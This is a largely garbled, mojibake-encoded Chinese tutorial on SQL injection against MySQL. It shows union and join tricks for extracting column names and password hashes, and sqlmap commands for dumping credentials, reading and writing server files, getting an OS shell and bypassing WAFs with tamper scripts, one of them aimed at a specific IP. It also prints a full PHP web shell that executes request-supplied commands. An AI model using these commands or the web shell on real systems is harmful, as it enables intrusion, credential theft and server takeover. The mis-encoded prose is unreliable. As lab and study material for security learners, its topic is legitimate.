è¡¨å­˜åœ¨è‡ªå¢IDï¼Œå°±å¯ä»¥é€šè¿‡è¯¥è§†å›¾æ¥è·å–å…¶è¡¨åå’Œæ‰€åœ¨æ•°æ®åº“å å…³äºè¯¥è¡¨çš„è§†å›¾ https://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-auto-increment-columns.html sys.schema_table_statistics_with_buffer 12345678# åˆ©ç”¨è¯­å¥#æŸ¥æ•°æ®åº“select table_schema from sys.schema_auto_increment_columns; #æŸ¥è¡¨select group_concat(table_name) from sys.schema_auto_increment_columns where table_schema = database(); select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database(); ç±»ä¼¼çš„ 123456789ä¸å®ƒè¡¨ç»“æ„ç›¸ä¼¼çš„è§†å›¾è¿˜æœ‰ sys.x$schema_table_statistics_with_buffer sys.x$schema_table_statistics sys.x$ps_schema_table_statistics_io å‚è€ƒï¼šhttps://www.docs4dev.com/docs/zh/mysql/5.7/reference/sys-schema-redundant-indexes.html 15.1.2 mysql é»˜è®¤å­˜å‚¨å¼•æ“ INNODB æ‰€æºå¸¦çš„è¡¨ mysql.innodb_table_stats mysql.innodb_index_stats 15.2 union select æ„é€ è™šè¡¨å®éªŒï¼š 12select * from `users`;select 1,2,3 union select * from users; 123456789101112131415161718192021222324mysql&gt; select 1,2,3 union select * from users;+----+----------+------------+| 1 | 2 | 3 |+----+----------+------------+| 1 | 2 | 3 || 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | 321 || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 15 | Dummy&#x27;# | 123 |+----+----------+------------+15 rows in set (0.00 sec)# æˆ‘ä»¬å°†åˆ—åæ›¿æ¢æˆä¸ºäº† æ•°å­— 1,2,3# é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨æ•°å­—æ¥å¯¹åº”å…¶ä¸­çš„åˆ—å 1234567891011121314151617181920212223mysql&gt; select `2` from (select 1,2,3 union select * from users)a;+----------+| 2 |+----------+| 2 || Dumb || Angelina || Dummy || secure || stupid || superman || batman || admin || admin1 || admin2 || admin3 || dhakkan || admin4 || Dummy&#x27;# |+----------+15 rows in set (0.00 sec)# è¿™æ—¶æˆ‘ä»¬å·²ç»å–åˆ°äº†ç¬¬äºŒåˆ—çš„å†…å®¹ 1234567891011121314151617181920212223# å½“ `` è¢«è¿‡æ»¤æ—¶ï¼Œä½¿ç”¨åˆ«åä»£æ›¿mysql&gt; select b from (select 1,2 as b,3 union select * from users)a;+----------+| b |+----------+| 2 || Dumb || Angelina || Dummy || secure || stupid || superman || batman || admin || admin1 || admin2 || admin3 || dhakkan || admin4 || Dummy&#x27;# |+----------+15 rows in set (0.00 sec) 12345678910111213141516171819202122232425# åŒæ—¶æŸ¥è¯¢å¤šåˆ—mysql&gt; select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a;+----------------------+| concat(`2`,0x5e,`3`) |+----------------------+| 2^3 || Dumb^Dumb || Angelina^I-kill-you || Dummy^321 || secure^crappy || stupid^stupidity || superman^genious || batman^mob!le || admin^admin || admin1^admin1 || admin2^admin2 || admin3^admin3 || dhakkan^dumbo || admin4^admin4 || Dummy&#x27;#^123 |+----------------------+15 rows in set (0.00 sec)# select concat(`2`,0x5e,`3`) from (select 1,2,3 union select * from users)a limit 0,1; 15.3 JOIN çˆ†ç ´æœ¬è´¨ï¼šé€šè¿‡ æŠ¥é”™ å¾—åˆ°åˆ—å join è¿æ¥ä¸¤å¼ è¡¨ using() ç”¨äºä¸¤å¼ è¡¨ä¹‹é—´çš„ join è¿æ¥æŸ¥è¯¢ï¼Œå¹¶ä¸” using()ä¸­çš„åˆ—åœ¨ä¸¤å¼ è¡¨ä¸­éƒ½å­˜åœ¨ï¼Œä½œä¸º join çš„æ¡ä»¶ 12345678910# å¸¸ç”¨è¯­å¥ select * from (select * from è¡¨å as a join è¡¨å as b)as c;# ä¸€ä¸€çˆ†å­—æ®µselect * from (select * from users as a join news as b)as c;select * from (select * from users a join users b using(id))c;select * from (select * from users a join users b using(id,name))c;# çˆ†å†…å®¹select * from (select * from users a join users b using(id,name,passwd))c; æµ‹è¯• åˆ›å»ºè¡¨ï¼š 12345create table users(id int,name varchar(20),passwd varchar(32));insert into users value(1,&#x27;mickey&#x27;,&#x27;827ccb0eea8a706c4c34a16891f84e7b&#x27;);create table news(is_admin int(1),id int(2),title varchar(100),date date);insert into news values(1,1,&#x27;hello,mickey&#x27;,now()); 123456789101112131415161718# çˆ†åˆ—åmysql&gt; select * from (select * from users as a join news as b)as c;ERROR 1060 (42S21): Duplicate column name &#x27;id&#x27;mysql&gt; select * from (select * from users a join users b using(id))c;ERROR 1060 (42S21): Duplicate column name &#x27;name&#x27;mysql&gt; select * from (select * from users a join users b using(id,name))c;ERROR 1060 (42S21): Duplicate column name &#x27;passwd&#x27;# çˆ†å†…å®¹mysql&gt; select * from (select * from users a join users b using(id,name,passwd))c;+------+--------+----------------------------------+| id | name | passwd |+------+--------+----------------------------------+| 1 | mickey | 827ccb0eea8a706c4c34a16891f84e7b |+------+--------+----------------------------------+1 row in set (0.00 sec) 123456789101112131415161718# çˆ†åˆ—åmysql&gt; select * from (select * from news a join news b using(id))as c;ERROR 1060 (42S21): Duplicate column name &#x27;is_admin&#x27;mysql&gt; select * from (select * from news a join news b using(id,is_admin))as c;ERROR 1060 (42S21): Duplicate column name &#x27;title&#x27;mysql&gt; select * from (select * from news a join news b using(id,is_admin,title))as c;ERROR 1060 (42S21): Duplicate column name &#x27;date&#x27;# çˆ†å†…å®¹mysql&gt; select * from (select * from news a join news b using(id,is_admin,title,date))as c;+----------+------+--------------+------------+| is_admin | id | title | date |+----------+------+--------------+------------+| 1 | 1 | hello,mickey | 2021-07-26 |+----------+------+--------------+------------+1 row in set (0.04 sec) åå…­ã€Mysql æŸ¥è¯¢è¯­å¥ ä¹‹ Handlerå®˜æ–¹æ–‡æ¡£ mysqlé™¤å¯ä½¿ç”¨selectæŸ¥è¯¢è¡¨ä¸­çš„æ•°æ®ï¼Œä¹Ÿå¯ä½¿ç”¨handlerè¯­å¥ï¼Œå®ƒæ¯æ¬¡åªèƒ½æŸ¥è¯¢1æ¡è®°å½•ï¼Œè€Œ select å¯ä»¥æ ¹æ®éœ€è¦è¿”å›å¤šæ¡æŸ¥è¯¢ç»“æœã€‚å› æ­¤ handlerè¯­ å¥å¹¶ä¸å…·å¤‡ select è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯mysqlä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°SQLæ ‡å‡†ä¸­ã€‚ HANDLERè¯­å¥æä¾›é€šå¾€è¡¨çš„ç›´æ¥é€šé“çš„å­˜å‚¨å¼•æ“æ¥å£ï¼Œå¯ä»¥ç”¨äºMyISAMå’ŒInnoDBè¡¨ã€‚ å¯ä»¥é™ä½ä¼˜åŒ–å™¨å¯¹äºSQLè¯­å¥çš„è§£æä¸ä¼˜åŒ–å¼€é”€ï¼Œä»è€Œæå‡æŸ¥è¯¢æ€§èƒ½ã€‚ æµ‹è¯•ï¼š 1234567891011create database practice;use practice;create table handler_table(id int,username varchar(10));desc handler_table;insert into handler_table values(1,&#x27;æå&#x27;);insert into handler_table values(2,&#x27;å°é©¬&#x27;);insert into handler_table values(3,&#x27;å¼ é‘«&#x27;);insert into handler_table values(4,&#x27;å‘¨æ˜&#x27;);insert into handler_table values(5,&#x27;è”¡ç´«&#x27;);select * from handler_tables; ä¸é€šè¿‡ç´¢å¼•æŸ¥è¡¨ï¼š 12345678910#æ‰“å¼€å¥æŸ„handler handler_table open;#æŸ¥è¯¢æ•°æ®handler handler_table read first;handler handler_table read next;handler handler_table read next;handler handler_table read next;handler handler_table read next;#å…³é—­å¥æŸ„handler handler_table close; 12345mysql&gt; handler handler_table close;Query OK, 0 rows affected (0.00 sec)mysql&gt; handler handler_table read next;ERROR 1109 (42S02): Unknown table &#x27;handler_table&#x27; in HANDLER é€šè¿‡ç´¢å¼•æŸ¥è¡¨ï¼šéœ€è¦åˆ›å»ºç´¢å¼• 1234567891011#ä»¥ handler_table ä¸­çš„ id å­—æ®µåˆ›å»ºç´¢å¼•ï¼Œå‘½åä¸º handler_indexcreate index handler_index on handler_table(id);#æ‰“å¼€å¥æŸ„ï¼Œå‘½åä¸º phandler handler_table open as p;#æŸ¥çœ‹æ•°æ®handler p read handler_index first;#ç¬¬ä¸€è¡Œhandler p read handler_index next;#ä¸‹ä¸€è¡Œhandler p read handler_index prev;#ä¸Šä¸€è¡Œhandler p read handler_index last;#æœ€åä¸€è¡Œ#å…³é—­å¥æŸ„handler p close; 123456789101112#ä»¥ handler_table ä¸­çš„ id å­—æ®µåˆ›å»ºç´¢å¼•ï¼Œå‘½åä¸º handler_indexcreate index handler_index on handler_table(id);#æ‰“å¼€å¥æŸ„handler handler_table open;#æŸ¥çœ‹ç‰¹å®šä½ç½®çš„æ•°æ®handler p handler_table read handler_index=(3);handler handler_table read handler_index first;#æŸ¥ç¬¬ä¸€æ¡handler handler_table read handler_index next;#æŸ¥ä¸‹ä¸€æ¡handler handler_table read handler_index prev;#æŸ¥ä¸Šä¸€æ¡handler handler_table read handler_index last;#æŸ¥æœ€åä¸€æ¡#å…³é—­å¥æŸ„handler handler_table close; 12#åˆ é™¤ç´¢å¼•drop index handler_index on handler_table; Handler ä¸ select çš„æ¯”è¾ƒï¼š selectè¯­å¥ä¸€æ¬¡è¿”å›æ‰€æœ‰ç›¸å…³è¡Œï¼Œhandleræ¯æ¬¡è¿”å›ä¸€è¡Œ HANDLERæ¶‰åŠçš„åˆ†æè¾ƒå°‘ï¼Œæ¯”SELECTæ›´å¿« æ²¡æœ‰ä¼˜åŒ–ç¨‹åºæˆ–æŸ¥è¯¢æ ¡éªŒå¼€é”€ åœ¨ä¸¤ä¸ªç®¡ç†ç¨‹åºè¯·æ±‚ä¹‹é—´ï¼Œä¸éœ€è¦é”å®šè¡¨ã€‚ å‚è€ƒ åä¸ƒã€SQLmap17.1 åŸºæœ¬æ‰‹æ³•ç®€ä»‹ æ”¯æŒå¤§é‡çš„æ•°æ®åº“ æ”¯æŒå¤šç§SQLæ³¨å…¥ï¼šå¸ƒå°”ç›²æ³¨ï¼Œæ—¶é—´æ³¨å…¥ï¼ŒæŠ¥é”™æ³¨å…¥ï¼Œè”åˆæŸ¥è¯¢ï¼Œå †å æ³¨å…¥ï¼Œä½¿ç”¨è„šæœ¬ åŠ ä¸Š -v -3 ä¼šæ˜¾ç¤ºå‡ºå…¶æ³¨å…¥è¯­å¥ 12345æ‰‹å†Œï¼špython sqlmap.py -hh å¯¼èˆªï¼špython sqlmap.py --wizard æµ‹è¯•URL: python sqlmap.py -u &quot;url&quot; å¸¸ç”¨æµ‹è¯•ï¼ˆä¸ç¡®å®šæ³¨å…¥æ‰‹æ®µï¼‰ 1234567python sqlmap.py -u &quot;url&quot;python sqlmap.py -u &quot;url&quot; --tamper randomcase.pypython sqlmap.py -u &quot;url&quot; --level 3//levelç”¨äºè®¾ç½®æ³¨å…¥ç­‰çº§1~6ï¼Œç­‰çº§è¶Šé«˜ï¼ŒåŒ…æ‹¬çš„è‡ªåŠ¨æ³¨å…¥æ‰‹æ®µè¶Šå¤š æŸ¥çœ‹æƒé™ 12345python sqlmap.py -u &quot;url&quot; --privileges #æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·æƒé™python sqlmap.py -u &quot;url&quot; --is-dba #åˆ¤æ–­æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜python sqlmap.py -u &quot;url&quot; --roles #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰² åŸºæœ¬ä¿¡æ¯å‘½ä»¤ 1234567891011121314151617æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·ï¼šå½“å½“å‰ç”¨æˆ·æœ‰æƒé™å»è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨çš„æƒé™æ—¶ï¼Œè¯¥å‘½ä»¤å¯ä»¥åˆ—å‡ºæ‰€æœ‰çš„ç®¡ç†å‘˜ç”¨æˆ· python sqlmap.py -u &quot;url&quot; --users æŸ¥çœ‹å½“å‰ç”¨æˆ·ï¼š python sqlmap.py -u &quot;url&quot; --current-user æŸ¥çœ‹æ‰€æœ‰ç”¨æˆ·çš„ æ•°æ®åº“ç”¨æˆ·å¯†ç ï¼š python sqlmap.py -u &quot;url&quot; --passwords python sqlmap.py -u &quot;url&quot; --dbs è·å– shell: python sqlmap.py -u &quot;url&quot; --os-shell å¸¸ç”¨æ³¨å…¥å‘½ä»¤ 12345678910111213141516171819æŸ¥çœ‹æ•°æ®åº“ python sqlmap.py -u &quot;url&quot; --dbsæŸ¥çœ‹ å½“å‰ ç½‘ç«™æ•°æ®åº“ï¼š python sqlmap.py -u &quot;url&quot; --current-db è·å–å½“å‰ç½‘ç«™æ•°æ®åº“ç”¨æˆ·çš„åç§°ï¼š python sqlmap.py -u &quot;url&quot; --current-user æŸ¥è¡¨ python sqlmap.py -u &quot;url&quot; -D &quot;security&quot; --tables æŸ¥åˆ— python sqlmap.py -u &quot;url&quot; -D &quot;security&quot; -T &quot;users&quot; --columns æŸ¥å­—æ®µå†…å®¹ python sqlmap.py -u &quot;url&quot; -D &quot;security&quot; -T &quot;users&quot; -C &quot;username,password&quot; --dump POST è¡¨å•ï¼Œç™»å½•æ¡†æ³¨å…¥ 123notepad post.txtå°†postè¯·æ±‚å¤åˆ¶ç²˜è´´è¿‡å»postè¯·æ±‚ï¼›python sqlmap.py -r &quot;post.txt(åŒ…å«æœ‰postè¯·æ±‚çš„æ–‡ä»¶)&quot; 1234567891011121314151617python sqlmap.py -u http://127.0.0.1/sqli-labs-master/Less-11/ --forms --level=5 --dbspython sqlmap.py -r æ–‡ä»¶è·¯å¾„+æ–‡ä»¶å.txt --dbspython sqlmap.py -r post.txt --password --batchpython sqlmap.py -r post.txt --os-shellpython sqlmap.py -u &quot;url&quot; -D &quot;åº“å&quot; --tables python sqlmap.py -u &quot;url&quot; -D &quot;åº“å&quot; -T &quot;è¡¨å&quot; --columns python sqlmap.py -u &quot;url&quot; -D &quot;åº“å&quot; -T &quot;è¡¨å&quot; -C &quot;å­—æ®µåï¼ˆæ³¨æ„ï¼šåŒ…å«æ‰€æœ‰çš„ï¼‰&quot; --dump python sqlmap.py -u &quot;url&quot; --priveliges #æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·æƒé™ python sqlmap.py -u &quot;url&quot; --is-dba #åˆ¤æ–­æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜ 123python sqlmap.py -u &quot;http://139.9.112.46:20871/&quot; --data=&quot;uname=admin&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&amp;passwd=1&amp;Submit=%E7%99%BB%E5%BD%95&quot; --sql-shellselect @@version; &#x27;10.0.27-MariaDB-0ubuntu0.16.04.1&#x27;select @@plugin_dir; &#x27;/usr/lib/mysql/plugin/&#x27; 17.2 è¿›é˜¶ æ¢æµ‹ç­‰çº§ï¼š 123--level 5--level 2 # HTTP cookieç­‰--level 3 # HTTP User-Agent/Refererç­‰ ä¸€å…±äº”ä¸ªç­‰çº§ï¼Œä¸åŠ  level æ—¶ç­‰çº§ä¸º1ï¼Œç­‰çº§è¶Šé«˜ï¼Œè¿›è¡Œæµ‹è¯•çš„ Payload è¶Šå¤šã€‚ä¼šè‡ªåŠ¨ç ´è§£å‡º cookie XFFç­‰æ³¨å…¥æ–¹å¼ã€‚ 1--is-dba # å½“å‰ç”¨æˆ·æ˜¯å¦æ˜¯ç®¡ç†å‘˜æƒé™ï¼Œå³å½“å‰è´¦æˆ·æ˜¯å¦æ˜¯æ•°æ®ç®¡ç†å‘˜è´¦æˆ· 1--roles # åˆ—å‡ºæ•°æ®åº“ç®¡ç†å‘˜è§’è‰² æŸ¥çœ‹æ•°æ®åº“ç”¨æˆ·è§’è‰²ï¼Œå¦‚æœå½“å‰ç”¨æˆ·æœ‰æƒé™è¯»å–åŒ…å«æ‰€æœ‰ç”¨æˆ·çš„è¡¨æ—¶ï¼Œå³å¯åˆ—å‡ºã€‚è¯¥å‘½ä»¤ä»…ä»…é€‚ç”¨äºæ•°æ®åº“æ˜¯ Oracle æ—¶ã€‚ 12--referer http://www.baidu.com# sqlmap å¯è¿›è¡Œä¼ªé€  HTTP ä¸­çš„ Referer å¤´ï¼Œå½“ --level &gt;=3 æ—¶ï¼Œå¯ä½¿ç”¨ referer æ¬ºéª— 12--sql-shell # è¿è¡Œè‡ªå®šä¹‰çš„ sql è¯­å¥# ä¼šè¿›å…¥ sql-shell&gt; äº¤äº’ï¼Œå¯ç›´æ¥è¾“å…¥ sql è¯­å¥è¿›è¡Œæ‰§è¡Œ 123--os-cmd--os-shell# è¿è¡Œä»»æ„æ“ä½œç³»ç»Ÿå‘½ä»¤ å½“æ•°æ®åº“ä¸ºMySQLã€PostgreSQLæˆ–SQLserverä¸”å½“å‰ç”¨æˆ·å…·æœ‰æƒé™ä½¿ç”¨ç‰¹å®šå‡½æ•°æ—¶è¯¥æŒ‡ä»¤ç”Ÿæ•ˆï¼Œä½†å®ç°çš„åŸç†æœ‰æ‰€ä¸åŒã€‚ æ•°æ®åº“ä¸ºMySQLå’ŒPostgreSQLæ—¶ï¼Œsqlmapå•†æˆ·é¤ä¸€ä¸ªäºŒè¿›åˆ¶åº“ï¼ŒåŒ…å«ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°sys_exec()å’Œsys_eval()è¿™ä¸¤ä¸ªå‡½æ•°å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨Microsoft SQL Serverä¸­ï¼Œsqlmapä½¿ç”¨xp_cmdshellå­˜å‚¨è¿‡ç¨‹ï¼Œå¦‚æœè¢«ç¦ç”¨ï¼ˆ2005åŠä»¥ä¸Šç‰ˆæœ¬é»˜è®¤ç¦ç”¨ï¼‰ï¼Œsqlmapä¼šé‡æ–°å¯ç”¨å®ƒï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ä¼šè¢«åˆ›å»ºã€‚ â€“os-shell å‚æ•°å¯ä»¥æ¨¡æ‹Ÿä¸€ä¸ªçœŸå®çš„Shellï¼Œå½“ä¸èƒ½æ‰§è¡Œå¤šè¯­å¥æ—¶ï¼Œä»å¯ä»¥ä½¿ç”¨INTO OUTFILEå†™è¿›å¯å†™ç›®å½•ï¼Œåˆ›å»ºä¸€ä¸ªWebåé—¨ã€‚â€“os-shellæ”¯æŒASPã€ASP.NETã€JSPå’ŒPHPå››ç§è¯­è¨€ã€‚ï¼ˆè¦æ‰§è¡Œæ”¹å‚æ•°ï¼Œéœ€è¦æœ‰æ•°æ®åº“ç®¡ç†å‘˜æƒé™ï¼Œâ€“is-dbaä¸ºTrueï¼‰ â€“os-shellçš„åˆ©ç”¨æ‰§è¡Œæ¡ä»¶ä¸‰ä¸ªï¼š ï¼ˆ1ï¼‰ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™ ï¼ˆ2ï¼‰æ”»å‡»è€…éœ€è¦çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ ï¼ˆ3ï¼‰GPCä¸ºoffï¼Œphpä¸»åŠ¨è½¬ä¹‰çš„åŠŸèƒ½å…³é—­ Sqlmap getshellçš„æ¡ä»¶ 1.ç½‘ç«™å¿…é¡»æ˜¯rootæƒé™2.çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ 123sqlmap.py -u &quot;&quot; --sql-shell# è¿›å…¥äº¤äº’ç¯å¢ƒ è¾“å…¥select @@datadir å¸¸è§æ‰¾ç»å¯¹è·¯å¾„æ–¹æ³•ï¼š1.ç½‘é¡µæŠ¥é”™ä¿¡æ¯2.Phpinfoï¼Œæ¢é’ˆ3.æ•°æ®åº“æŸ¥è¯¢ï¼Œæš´åŠ›ç ´è§£ 3.PHPå…³é—­é­”æœ¯å¼•å·ï¼Œphpä¸»åŠ¨è½¬ä¹‰åŠŸèƒ½å…³é—­ magic_quotes_gpc=Off 4.secure_file_priv=å€¼ä¸ºç©ºï¼šsecure_file_privå‚æ•°æ˜¯ç”¨æ¥é™åˆ¶LOAD DATA,SELECTâ€¦OUTFILE,and LOAD_FILE()ä¼ åˆ°å“ªä¸ªæŒ‡å®šç›®å½•çš„ 1show global variables like &#x27;%secure%&#x27;; å¦‚æœæ˜¯ä¸ºç©ºï¼Œè¯´æ˜MYSQLé»˜è®¤æ²¡æœ‰secure_file_privå‚æ•°ï¼Œå› æ­¤åœ¨mysql-iniè¿›è¡Œæ·»åŠ é…ç½®æ·»åŠ è¯­å¥secure_file_priv= å³å¯ æµ‹è¯•ï¼š é€‰æ‹©ç½‘ç«™è¯­è¨€ è¾“å…¥ç»å¯¹ç½‘ç«™è·¯å¾„ è¿›å…¥ os-shell&gt; äº¤äº’ç¯å¢ƒ æŸ¥çœ‹ç½‘ç«™æ ¹ç›®å½•ï¼Œå‘ç°ç”Ÿæˆæ–‡ä»¶ åŸç†ï¼šç”¨into outfile å‡½æ•°å°†ä¸€ä¸ªå¯ä»¥ç”¨æ¥ä¸Šä¼ æ–‡ä»¶çš„ php æ–‡ä»¶å†™åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ ç„¶ååˆ©ç”¨è¯¥ä¸Šä¼ è„šæœ¬æˆ‘ä»¬å¯ä»¥ä¸Šä¼ æœ¨é©¬æ–‡ä»¶ï¼Œè¿›è¡Œè®¿é—®ï¼Œèšå‰‘é“¾æ¥ï¼Œgetshell sqlmap ä¼šè‡ªåŠ¨åˆ©ç”¨ä¸Šä¼ æ–‡ä»¶ä¸Šä¼ ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶å¯ä»¥ç”¨æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶å°†ç»“æœè¿”å›ï¼Œåˆ™æˆ‘ä»¬å¯ä»¥åœ¨äº¤äº’ç¯å¢ƒä¸‹ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚ http://www.qishunwang.net/news_show_47793.aspx https://www.cnblogs.com/zzjdbk/p/13951047.html è¯¥ä¸Šä¼ æ–‡ä»¶é¡µé¢å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?php$c=$_REQUEST[&quot;cmd&quot;];@set_time_limit(0);@ignore_user_abort(1);@ini_set(&#x27;max_execution_time&#x27;,0);$z=@ini_get(&#x27;disable_functions&#x27;);if(!empty($z))&#123; $z=preg_replace(&#x27;/[, ]+/&#x27;,&#x27;,&#x27;,$z); $z=explode(&#x27;,&#x27;,$z); $z=array_map(&#x27;trim&#x27;,$z);&#125;else &#123; $z=array(); &#125;$c=$c.&quot; 2&gt;&amp;1\\n&quot;;function f($n)&#123;global $z;return is_callable($n)and!in_array($n,$z);&#125;if(f(&#x27;system&#x27;))&#123;ob_start();system($c);$w=ob_get_contents();ob_end_clean();&#125;elseif(f(&#x27;proc_open&#x27;))&#123; $y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t); $w=NULL; while(!feof($t[1]))&#123; $w.=fread($t[1],512); &#125; @proc_close($y);&#125; elseif(f(&#x27;shell_exec&#x27;))&#123; $w=shell_exec($c); &#125; elseif(f(&#x27;passthru&#x27;))&#123; ob_start(); passthru($c); $w=ob_get_contents(); ob_end_clean(); &#125;elseif(f(&#x27;popen&#x27;))&#123; $x=popen($c,r); $w=NULL; if(is_resource($x))&#123; while(!feof($x))&#123; $w.=fread($x,512); &#125; &#125; @pclose($x); &#125;elseif(f(&#x27;exec&#x27;))&#123; $w=array(); exec($c,$w); $w=join(chr(10),$w).chr(10); &#125;else&#123; $w=0; &#125; print &quot;&lt;/pre&gt;&quot;.$w.&quot;&lt;/pre&gt;&quot;;?&gt;&#x27;&#x27;&#x27; 12--file-read# ä»æ•°æ®åº“æœåŠ¡å™¨ä¸­è¯»å–æ–‡ä»¶ é€‚ç”¨äºMySQLã€PostgreSQLæˆ–Microsoft SQL Serverä¸”å½“å‰ç”¨æˆ·æœ‰æƒé™æ‰§è¡Œç‰¹å®šçš„å‡½æ•°æ—¶ã€‚è¯»å–çš„æ–‡ä»¶å¯ä»¥æ˜¯æ–‡æœ¬å¯ä»¥æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ã€‚ 1python sqlmap.py -u &quot;&quot; --file-read &quot;è·¯å¾„&quot; -v 1 12345--file-write --file-dest# ä¸Šä¼ æ–‡ä»¶åˆ°æ•°æ®åº“æœåŠ¡å™¨ä¸­# file-write ä»æœ¬åœ°å†™å…¥# file-dest å†™å…¥ç›®æ ‡è·¯å¾„ æ•°æ®åº“ï¼šMySQLã€PostgreSQLã€Microsoft SQL Serverä¸”ï¼šå½“å‰ç”¨æˆ·æœ‰æƒé™ä½¿ç”¨ç‰¹å®šçš„å‡½æ•°æ—¶ã€‚å¯ä»¥ä¸Šä¼ æ–‡æœ¬æ–‡ä»¶æˆ–äºŒè¿›åˆ¶æ–‡ä»¶ 1234sqlmap.py -u &quot;http://www.xx.com/aa.aspx?id=123&quot; --file-write=æœ¬åœ°æ–‡ä»¶è·¯å¾„ --file-dest ç½‘ç«™è·¯å¾„(å†™å…¥è·¯å¾„)+&quot;/å†™å…¥çš„æ–‡ä»¶å&quot;sqlmap.py -u &quot;http://www.xx.com/aa.aspx?id=123&quot; --file-write=F:/a.aspx --file-dest D:/è™šæ‹Ÿç›®å½•/Front/cx.aspx 17.3 â€“tampersqlmapåœ¨é»˜è®¤çš„çš„æƒ…å†µä¸‹é™¤äº†ä½¿ç”¨char()å‡½æ•°é˜²æ­¢å‡ºç°å•å¼•å·ï¼Œæ²¡æœ‰å¯¹æ³¨å…¥çš„æ•°æ®è¿›è¡Œä¿®æ”¹ï¼Œè¿˜å¯ä»¥ä½¿ç”¨â€“tamperå‚æ•°å¯¹æ•°æ®åšä¿®æ”¹æ¥ç»•è¿‡wafç­‰è®¾å¤‡ã€‚ https://blog.csdn.net/qq_34444097/article/details/82717357 ç»•è¿‡è„šæœ¬ç›®å½•åœ¨ sqlmap/tamperï¼Œç›®å‰å®˜æ–¹æä¾› 53 ä¸ªç»•è¿‡è„šæœ¬ 1sqlmap -u [url] --tamper [æ¨¡å—å] å¯ä»¥ä½¿ç”¨â€“identify-wafå¯¹ä¸€äº›ç½‘ç«™æ˜¯å¦æœ‰å®‰å…¨é˜²æŠ¤è¿›è¡Œè¯•æ¢ 0x02 å¸¸ç”¨tamperè„šæœ¬apostrophemask.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šå°†å¼•å·æ›¿æ¢ä¸ºutf-8ï¼Œç”¨äºè¿‡æ»¤å•å¼•å·ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1 AND â€˜1â€™=â€™1â€)ä½¿ç”¨è„šæœ¬åï¼š1 AND %EF%BC%871%EF%BC%87=%EF%BC%871 base64encode.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šæ›¿æ¢ä¸ºbase64ç¼–ç ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€œ1â€™ AND SLEEP(5)#â€)ä½¿ç”¨è„šæœ¬åï¼šMScgQU5EIFNMRUVQKDUpIw== multiplespaces.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šå›´ç»•sqlå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT foobarâ€™)ä½¿ç”¨è„šæœ¬åï¼š1 UNION SELECT foobar space2plus.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šç”¨åŠ å·æ›¿æ¢ç©ºæ ¼ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT+id+FROM+users nonrecursivereplacement.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šä½œä¸ºåŒé‡æŸ¥è¯¢è¯­å¥ï¼Œç”¨åŒé‡è¯­å¥æ›¿ä»£é¢„å®šä¹‰çš„sqlå…³é”®å­—ï¼ˆé€‚ç”¨äºéå¸¸å¼±çš„è‡ªå®šä¹‰è¿‡æ»¤å™¨ï¼Œä¾‹å¦‚å°†selectæ›¿æ¢ä¸ºç©ºï¼‰ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜1 UNION SELECT 2â€“â€™)ä½¿ç”¨è„šæœ¬åï¼š1 UNIOUNIONN SELESELECTCT 2â€“ space2randomblank.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šå°†ç©ºæ ¼æ›¿æ¢ä¸ºå…¶ä»–æœ‰æ•ˆå­—ç¬¦ä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜SELECT id FROM usersâ€™)ä½¿ç”¨è„šæœ¬åï¼šSELECT%0Did%0DFROM%0Ausers unionalltounion.pyé€‚ç”¨æ•°æ®åº“ï¼šALLä½œç”¨ï¼šå°†union allselect æ›¿æ¢ä¸ºunionselectä½¿ç”¨è„šæœ¬å‰ï¼štamper(â€˜-1 UNION ALL SELECTâ€™)ä½¿ç”¨è„šæœ¬åï¼š-1 UNION SELECT 